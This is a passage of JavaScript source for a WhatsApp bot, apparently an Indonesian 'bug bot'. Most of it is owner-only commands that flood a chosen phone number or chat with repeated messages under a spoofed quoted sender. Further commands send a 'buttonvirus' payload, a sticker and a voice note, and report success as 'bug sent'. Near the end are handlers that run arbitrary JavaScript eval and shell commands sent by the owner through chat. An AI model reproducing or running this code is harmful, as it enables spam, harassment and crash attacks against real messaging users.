            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            m.reply(`BERHASIL MENGIRIM SANTET`)
            break
                    case 'infinite':               
          if (!isCreator) return
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `ANGGAZYY 404ˣ_ˣ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            break
            case 'infiniteto':               
          if (!isCreator) return
          if (!text) throw `Nomernya mana?`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `ANGGAZYY 404ˣ_ˣ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            m.reply(`SUCCES`)
            break
                   case 'gasinfinite':               
          if (!isCreator) return
          if (!text) throw `Nomernya mana?`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `ANGGAZYY 404ˣ_ˣ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            break
          case 'momo': {            
          if (!isCreator) return
             momoe = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `ANGGAZYY 404ˣ_ˣ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await anggazyy404.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await anggazyy404.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            }
            break
          case 'momoto': { 
          if (!isCreator) return
          if (!text) throw `Nomernya mana?` 
             momoe = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `ANGGAZYY 404ˣ_ˣ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            }
            break
          case 'gasmomo': {            
          if (!isCreator) return
           if (!text) throw `Nomernya mana?`       
             momoe = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`

             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `ANGGAZYY 404ˣ_ˣ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await anggazyy404.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            }
            break

case 'butto':
                    if (!isCreator) return
                    if (!text) throw `Nomernya mana?`
                 buttonspc = [
                          {buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: jobot}, type: 1},
  {buttonId: 'babaabbabababa', buttonText: {displayText: buttonvirus}, type: 1},
  {buttonId: 'babababbababa', buttonText: {displayText: jobot}, type: 1}
]
                      
                    buttonMessagepc = {
                          text: "JOMBLO",
                          footerText: 'JONES',
                          buttons: buttonspc,
                          headerType: 1
                      }
                      anggazyy404.sendMessage(`${text}@s.whatsapp.net`, buttonMessagepc)
                      m.reply(`succes`)
                    break
case 'stikto':{
if (!isCreator) return
if (!text) throw `Nomernya mana?`
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `kontol`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 hey = fs.readFileSync('./anggazyy/anjas.webp')
anggazyy404.sendImageAsSticker(`${text}@s.whatsapp.net`, hey, adehvn, { packname: global.packname, author: global.author })
await m.reply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
}
break
case 'vnto':{
if (!isCreator) return
if (!text) throw `Nomernya mana?`
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `kontol`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 hey = fs.readFileSync('chan.mp3')
 anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
await m.reply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
}
break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return m.reply(`${err}`)
                        if (stdout) return m.reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    let room = Object.values(db.data.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    anggazyy404.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
